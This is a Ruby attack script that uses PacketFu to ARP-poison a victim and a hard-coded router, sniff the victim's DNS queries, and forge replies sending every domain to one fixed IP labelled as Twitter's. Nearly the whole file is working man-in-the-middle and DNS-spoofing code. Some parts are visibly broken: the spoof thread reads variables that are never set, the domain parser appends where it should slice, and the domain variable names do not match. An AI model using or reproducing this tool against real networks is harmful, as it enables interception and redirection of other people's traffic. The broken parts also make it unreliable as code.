#!/usr/bin/ruby
require 'rubygems'
require 'packetfu'
require 'thread'

unless (ARGV.size == 2)
	puts "Usage: ruby #{$0} [Interface] [Victim IP]"
	puts "Example: ruby #{$0} em1 192.168.0.2"
	exit
end

def initA(intface, victimIP)
	@interface = intface
	@victimIP = victimIP
	@routerIP = "192.168.0.100"
	@srcMAC = PacketFu::Utils.whoami?(:iface => @interface)
	@victimMAC = PacketFu::Utils.arp(@victimIP, :iface => @interface)
	@routerMAC = PacketFu::Utils.arp(@routerIP, :iface => @interface)

	# Construct the target's packet
	arp_packet_target = PacketFu::ARPPacket.new()
	arp_packet_target.eth_saddr = @srcMAC[:eth_saddr]       # sender's MAC address
	arp_packet_target.eth_daddr = @victimMAC       		# target's MAC address
	arp_packet_target.arp_saddr_mac = @srcMAC[:eth_saddr]   # sender's MAC address
	arp_packet_target.arp_daddr_mac = @victimMAC   		# target's MAC address
	arp_packet_target.arp_saddr_ip = @routerIP        	# router's IP
	arp_packet_target.arp_daddr_ip = @victimIP         	# target's IP
	arp_packet_target.arp_opcode = 2                        # arp code 2 == ARP reply
	 
	# Construct the router's packet
	arp_packet_router = PacketFu::ARPPacket.new()
	arp_packet_router.eth_saddr = @srcMAC[:eth_saddr]       # sender's MAC address
	arp_packet_router.eth_daddr = @routerMAC       		# router's MAC address
	arp_packet_router.arp_saddr_mac = @srcMAC[:eth_saddr]   # sender's MAC address
	arp_packet_router.arp_daddr_mac = @routerMAC   		# router's MAC address
	arp_packet_router.arp_saddr_ip = @victimIP         	# target's IP
	arp_packet_router.arp_daddr_ip = @routerIP       	# router's IP
	arp_packet_router.arp_opcode = 2                        # arp code 2 == ARP reply

	# Initialize IP Forwarding
	`echo 1 > /proc/sys/net/ipv4/ip_forward`

end

def spoofThread(arp_packet_victim, arp_packet_router)

	while true
		sleep 2
		arp_packet_victim.to_w(@interface)
		arp_packet_router.to_w(@interface)
	end
end

def getDomain(payload)
	domainName = ""
	
	while true
		#length = payload[0].unpack('c*')[0]
		length = payload[0].to_i
		if(length != 0)
			domainName += payload[1, length] + "."
			payload += payload[length + 1..-1]
		else
			return domainName = domainName[0, domainName.length - 1]
		end
	end
	puts "Domain Info: " + domainName
end

def dnsResponse
	udp_packet = PacketFu::UDPPacket.new(:config => @srcMAC, 
					     :udp_src => @packet.udp_dst, 
					     :udp_dst => @packet.udp_src)

	# Create UDP Packet
	udp_packet.eth_daddr = @victimMAC
	udp_packet.ip_daddr = @victimIP
	udp_packet.ip_saddr = @packet.ip_daddr
	udp_packet.udp_src = @packet.udp_dst
	udp_packet.udp_dst = @packet.udp_src

	# Parse Transaction ID
	udp_packet.payload = @packet.payload[0, 2]

	udp_packet.payload += "\x81\x80" + "\x00\x01\x00\x01" + "\x00\x00\x00\x00"

	# Parse Domain Name
	@domainName.split('.').each do |section|
		udp_packet.payload += section.length.chr
		udp_packet.payload += section
	end

	udp_packet.payload += "\x00\x00\x01\x00\x01"
	udp_packet.payload += "\xc0\x0c"
	udp_packet.payload += "\x00\x01\x00\x01"
	udp_packet.payload += "\x00\x00\x00\xc0"
	udp_packet.payload += "\x00\x04"

	#ip = @srcMAC[:ip_saddr].split('.')
	twitter_IP = "199.59.149.230" # Twitter IP
	domain_IP = twitter_IP.split('.')
	payload_domain = [domain_IP[0].to_i, domain_IP[1].to_i, domain_IP[2].to_i, domain_IP[3].to_i].pack('c*')

	# Append the Domain Name payload
	udp_packet.payload += payload_domain

	# Calculate the packet
	udp_packet.recalc

	# Send packet
	udp_packet.to_w(@interface)
		puts "DNS Response Sent."

end

begin

	intface = ARGV[0]
	victIP = ARGV[1]

	puts "Victim IP: " + victIP
	puts "Interface: " + intface

	initA(intface, victIP)

	puts "Source MAC: " + @srcMAC[:eth_saddr].to_s
	puts "Dest MAC: " + @victimMAC.to_s

	puts "Initiating ARP thread..."
	arp_spoof_thread = Thread.new{spoofThread(@arp_packet_target, @arp_packet_router)}

	capture = PacketFu::Capture.new(:iface => @interface, 
					:start => true, 
					:promisc => true, 
					:filter => "src #{@victimIP} and udp port 53",
					:save => true)

	puts "Capturing DNS Queries..."
	capture.stream.each do |packet|

		@packet = PacketFu::Packet.parse(packet)
		dnsQuery = @packet.payload[2].unpack('h*')[0].chr + @packet.payload[3].unpack('h*')[0].chr
		if dnsQuery == '10'
			@domain = getDomain(@packet.payload[12..-1])
			if @domain.nil?
				puts "No domain name found"
				next
			end
			puts "DNS Query for: " + @domain
			dnsResponse
		end
	end # End do packet

	# Catch interrupt
	rescue Interrupt
		puts "\nDNS spoof interrupt detected."
		Thread.kill(arp_spoof_thread)
		`echo 0 > /proc/sys/net/ipv4/ip_forward`
		exit 0

end # End main
